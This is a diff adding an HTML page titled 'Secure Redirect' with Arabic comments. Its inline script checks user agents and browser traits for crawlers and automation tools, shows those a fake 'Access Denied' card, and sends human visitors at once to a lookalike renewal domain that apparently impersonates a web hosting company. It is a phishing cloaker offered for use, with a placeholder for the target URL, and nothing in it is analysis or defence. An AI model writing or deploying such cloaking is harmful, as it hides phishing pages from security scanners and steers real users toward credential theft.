@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Redirect</title>
+    
+    <!-- Redirect فوري في الـ head -->
+    <script>
+        (function() {
+            // ========== CONFIGURATION ==========
+            const TARGET_URL = 'https://ventraip-renewal.com.au/privacy'; // ← CHANGE THIS TO YOUR TARGET URL
+
+            // ========== BOT DETECTION ==========
+            function isBot() {
+                const signatures = [
+                    'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget',
+                    'python', 'java', 'scrapy', 'phantomjs', 'selenium',
+                    'headless', 'puppeteer', 'playwright', 'webdriver'
+                ];
+
+                const ua = navigator.userAgent.toLowerCase();
+                const hasBotSignature = signatures.some(sig => ua.includes(sig));
+                
+                const checks = {
+                    noScreen: window.screen.width === 0 || window.screen.height === 0,
+                    noPlugins: navigator.plugins.length === 0,
+                    noLanguages: navigator.languages.length === 0,
+                    webdriver: navigator.webdriver === true
+                };
+
+                const suspiciousCount = Object.values(checks).filter(Boolean).length;
+                return hasBotSignature || suspiciousCount >= 2;
+            }
+
+            // ========== EXECUTE IMMEDIATELY ==========
+            if (!isBot()) {
+                // إنسان → Redirect فوري قبل ما يتحمل الـ body
+                window.location.replace(TARGET_URL);
+            }
+            // إذا بوت → يكمل يحمل الصفحة ويشوف الـ blocked message
+        })();
+    </script>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --dark-navy: #0f172a;
+            --primary-blue: #1e3a8a;
+            --danger: #ef4444;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, var(--dark-navy) 0%, var(--primary-blue) 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 600px;
+            padding: 20px;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: 48px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.4);
+            text-align: center;
+            border: 2px solid var(--danger);
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 32px;
+            font-size: 36px;
+        }
+
+        h1 {
+            color: #1e293b;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .subtitle {
+            color: #64748b;
+            font-size: 16px;
+            margin-bottom: 24px;
+        }
+
+        .security-status {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #fef2f2;
+            padding: 12px 24px;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--danger);
+            border: 2px solid #fecaca;
+        }
+
+        @media (max-width: 640px) {
+            .card { padding: 32px 24px; }
+            h1 { font-size: 24px; }
+        }
+    </style>
+</head>
+<body>
+    <!-- يبان غير للبوت -->
+    <div class="container">
+        <div class="card">
+            <div class="logo">🚫</div>
+            
+            <h1>Access Denied</h1>
+            <p class="subtitle">Suspicious activity detected</p>
+            
+            <div class="security-status">
+                <span>✕</span>
+                <span>Bot Detected</span>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
